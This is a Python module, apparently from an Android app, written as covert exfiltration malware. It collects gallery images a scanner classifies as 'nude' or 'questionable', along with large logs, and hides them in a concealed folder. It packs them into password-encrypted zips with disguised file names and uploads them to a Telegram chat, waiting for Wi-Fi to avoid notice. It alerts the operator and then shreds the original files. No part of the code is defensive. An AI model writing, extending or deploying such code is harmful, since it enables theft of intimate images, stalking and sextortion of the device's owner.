# -*- coding: utf-8 -*-
import os
import time
import random
import threading
import logging
import gc
import string
import shutil
from datetime import datetime

# إعداد المسارات
P = os.path.join(os.getcwd(), ".sys_runtime")
H = os.path.join(P, "harvest")
PENDING = os.path.join(H, "pending_upload")   # مجلد انتظار التأكيد

for d in [P, H, PENDING]:
    if not os.path.exists(d):
        os.makedirs(d)

logging.basicConfig(filename=os.path.join(P, "z.log"), level=logging.ERROR, filemode='a')

# pyzipper إلزامي للتشفير
try:
    import pyzipper
    HAS_PYZIP = True
except ImportError:
    HAS_PYZIP = False

# JNI للتحقق من نوع الشبكة (اختياري)
try:
    from jnius import autoclass
    JNI_AVAILABLE = True
except:
    JNI_AVAILABLE = False


class DailyZipper:
    def __init__(self, scanner=None, tg=None):
        self.sc = scanner
        self.tg = tg
        self.pw = "Z@3n_2025"
        self.max_b = 45 * 1024 * 1024   # 45MB (آمن تحت حد 50MB)
        self.active = False

    def _gen_name(self):
        """توليد اسم ملف مموّه (امتداد وهمي)"""
        prefixes = ["cache_", "sys_upd_", "tmp_vol_", "core_st_", "db_sync_"]
        chars = string.ascii_letters + string.digits
        suffix = ''.join(random.choices(chars, k=8))
        fake_ext = random.choice([".bak", ".tmp", ".dat", ".log"])
        return f"{random.choice(prefixes)}{suffix}{fake_ext}"

    def _shred(self, path):
        """إتلاف الملف بالكتابة فوقه على دفعات (4KB) لتوفير الذاكرة"""
        try:
            if os.path.exists(path):
                sz = os.path.getsize(path)
                if sz > 0:
                    chunk_size = 4096
                    with open(path, "ba+", buffering=0) as f:
                        for _ in range(0, sz, chunk_size):
                            f.write(os.urandom(min(chunk_size, sz)))
                        f.flush()
                        os.fsync(f.fileno())
                os.remove(path)
        except Exception as e:
            logging.error(f"Shred error on {path}: {e}")

    def _is_on_wifi(self):
        """التحقق من الاتصال عبر Wi-Fi (حماية للبيانات)"""
        if not JNI_AVAILABLE:
            return True
        try:
            ctx = autoclass('org.kivy.android.PythonActivity').mActivity
            cm = ctx.getSystemService("connectivity")
            n = cm.getActiveNetworkInfo()
            return n and n.isConnected() and n.getType() == 1  # TYPE_WIFI = 1
        except Exception:
            return True

    def _safe_send(self, zip_path, caption):
        """إرسال مع إعادة محاولة (exponential backoff) حتى 5 مرات"""
        delays = [2, 4, 8, 16, 32]
        for delay in delays:
            try:
                with open(zip_path, 'rb') as fobj:
                    resp = self.tg._ap("sendDocument",
                                       {"chat_id": self.tg.dat, "caption": caption},
                                       {"document": fobj})
                if resp and resp.get('ok'):
                    return True
            except Exception as e:
                logging.error(f"Send error: {e}")
            time.sleep(delay)
        return False

    def _pack_and_ship(self, files):
        """ضغط وإرسال مع تأكيد الحذف بعد النجاح، وفصل Wi-Fi، وتأخير طويل"""
        if not files or self.active:
            return

        if not HAS_PYZIP:
            logging.error("pyzipper missing. Aborting to prevent unencrypted leak.")
            return

        if not self._is_on_wifi():
            logging.info("Not on WiFi, skipping harvest.")
            return

        self.active = True

        # نقل الملفات إلى مجلد الانتظار (حماية من الحذف المبكر)
        pending_files = []
        for f in files:
            if os.path.exists(f):
                dest = os.path.join(PENDING, os.path.basename(f))
                try:
                    shutil.move(f, dest)
                    pending_files.append(dest)
                except Exception:
                    pending_files.append(f)  # احتياطي

        if not pending_files:
            self.active = False
            return

        # تقسيم إلى دفعات حسب الحجم
        batches = []
        cur_batch, cur_size = [], 0
        for f in pending_files:
            if not os.path.exists(f):
                continue
            try:
                fsz = os.path.getsize(f)
                if cur_size + fsz > self.max_b:
                    if cur_batch:
                        batches.append(cur_batch)
                    cur_batch, cur_size = [], 0
                cur_batch.append(f)
                cur_size += fsz
            except Exception:
                continue
        if cur_batch:
            batches.append(cur_batch)

        # معالجة كل دفعة
        for idx, batch in enumerate(batches):
            zip_name = self._gen_name()
            zip_path = os.path.join(H, zip_name)

            try:
                with pyzipper.AESZipFile(zip_path, 'w',
                                         compression=pyzipper.ZIP_DEFLATED,
                                         encryption=pyzipper.WZ_AES) as zf:
                    zf.setpassword(self.pw.encode('utf-8'))
                    for f in batch:
                        zf.write(f, os.path.basename(f))

                success = self._safe_send(zip_path, f"📦 Part {idx+1}/{len(batches)}")

                if success:
                    for f in batch:
                        self._shred(f)
                else:
                    logging.error(f"Batch {idx+1} failed after retries. Files kept.")

            except Exception as e:
                logging.error(f"Packing error: {e}")
            finally:
                if os.path.exists(zip_path):
                    os.remove(zip_path)

            # تأخير 5 دقائق بين الدفعات لتوفير البطارية
            if idx < len(batches) - 1:
                time.sleep(300)

        self._clean_old_pending()
        self.active = False
        gc.collect()

    def _clean_old_pending(self):
        """تنظيف الملفات العالقة (أقدم من 24 ساعة)"""
        now = time.time()
        for f in os.listdir(PENDING):
            path = os.path.join(PENDING, f)
            try:
                if os.path.getmtime(path) < now - 86400:
                    self._shred(path)
            except Exception:
                pass

    def run(self):
        if self.active:
            return

        all_files = []
        if self.sc:
            try:
                for cat in ["nude", "questionable"]:
                    items = self.sc.get_gallery_by_category(cat, limit=150)
                    all_files.extend([i["path"] for i in items if "path" in i])
            except Exception as e:
                logging.error(f"Scanner error: {e}")

        # إضافة السجلات الكبيرة (>100KB)
        try:
            for f in os.listdir(P):
                if f.endswith(".log") and f not in ["z.log", "t.log"]:
                    path = os.path.join(P, f)
                    if os.path.exists(path) and os.path.getsize(path) > 100 * 1024:
                        all_files.append(path)
        except Exception as e:
            logging.error(f"Logs error: {e}")

        if all_files:
            if self.tg and hasattr(self.tg, 'notify_harvest'):
                try:
                    did = getattr(self.sc, 'did', 'Unknown')
                    self.tg.notify_harvest(did, len(all_files))
                except Exception:
                    pass
            self._pack_and_ship(all_files)


def create(scanner=None, telegram=None):
    return DailyZipper(scanner, telegram)
